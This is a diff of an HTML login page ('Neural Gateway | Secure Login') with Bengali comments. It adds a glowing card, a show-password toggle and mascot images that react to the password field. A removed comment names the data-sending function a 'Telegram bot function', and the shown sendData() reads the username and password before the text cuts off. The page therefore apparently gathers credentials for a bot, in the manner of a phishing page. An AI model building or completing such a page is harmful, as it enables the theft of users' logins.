@@ -5,10 +5,31 @@
     <title>Neural Gateway | Secure Login</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .glass-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 30px; text-align: center; width: 350px; }
-        #mascot-img { width: 180px; height: 180px; margin-bottom: 20px; transition: 0.3s; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(0,0,0,0.3); border: 1px solid #444; color: white; border-radius: 10px; outline: none; }
-        button { width: 100%; padding: 15px; margin-top: 10px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        
+        .glass-card { 
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); 
+            padding: 40px; border-radius: 30px; text-align: center; width: 350px; 
+            border: 2px solid #00ff88; box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+            animation: borderGlow 3s infinite alternate;
+        }
+
+        @keyframes borderGlow {
+            0% { border-color: #00ff88; box-shadow: 0 0 10px #00ff88; }
+            100% { border-color: #0088ff; box-shadow: 0 0 20px #0088ff; }
+        }
+
+        #mascot-img { width: 150px; height: 150px; margin-bottom: 20px; transition: 0.3s; border-radius: 50%; }
+        
+        input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(0,0,0,0.3); border: 1px solid #444; color: white; border-radius: 10px; outline: none; box-sizing: border-box; }
+        
+        .pass-container { position: relative; display: flex; align-items: center; }
+        
+        #toggle-pass { 
+            position: absolute; right: 10px; background: transparent; border: none; 
+            color: #00ff88; cursor: pointer; font-size: 18px; 
+        }
+
+        button.login-btn { width: 100%; padding: 15px; margin-top: 10px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -18,25 +39,45 @@
     
     <div id="login-form">
         <input type="text" id="username" placeholder="Username">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="sendData()">SECURE LOGIN</button>
+        
+        <div class="pass-container">
+            <input type="password" id="password" placeholder="Password">
+            <button id="toggle-pass" type="button">👁️</button>
+        </div>
+        
+        <button class="login-btn" onclick="sendData()">SECURE LOGIN</button>
     </div>
 </div>
 
 <script>
     const img = document.getElementById('mascot-img');
     const pass = document.getElementById('password');
+    const toggleBtn = document.getElementById('toggle-pass');
 
-    // পোজ পরিবর্তন লজিক
-    pass.addEventListener('focus', () => img.src = '1000022716.jpg'); // চোখ ঢাকা
-    pass.addEventListener('blur', () => img.src = '1000022715.jpg');  // সাধারণ অবস্থা
-
-    // পাসওয়ার্ড টাইপ করলে আঙুল ফাঁক করে দেখা (peeking)
-    pass.addEventListener('input', () => {
-        if(pass.value.length > 0) img.src = '1000022717.jpg';
+    // ১. ফোকাস করলে চোখ বন্ধ ছবি (1000022716.jpg)
+    pass.addEventListener('focus', () => {
+        img.src = '1000022716.jpg';
     });
 
-    // টেলিগ্রাম বট ফাংশন
+    // ২. ফোকাস সরে গেলে সাধারণ ছবি (1000022715.jpg)
+    pass.addEventListener('blur', () => {
+        img.src = '1000022715.jpg';
+    });
+
+    // ৩. চোখ আইকনে ক্লিক করলে পোজ পরিবর্তন ও পাসওয়ার্ড দেখা
+    toggleBtn.addEventListener('click', () => {
+        if (pass.type === "password") {
+            pass.type = "text";
+            img.src = '1000022717.jpg'; // এক চোখ খোলা ছবি
+            toggleBtn.innerText = "🙈";
+        } else {
+            pass.type = "password";
+            img.src = '1000022716.jpg'; // আবার চোখ বন্ধ
+            toggleBtn.innerText = "👁️";
+        }
+    });
+
+    // ৪. ডাটা পাঠানো
     function sendData() {
         const user = document.getElementById('username').value;
         const passVal = pass.value;
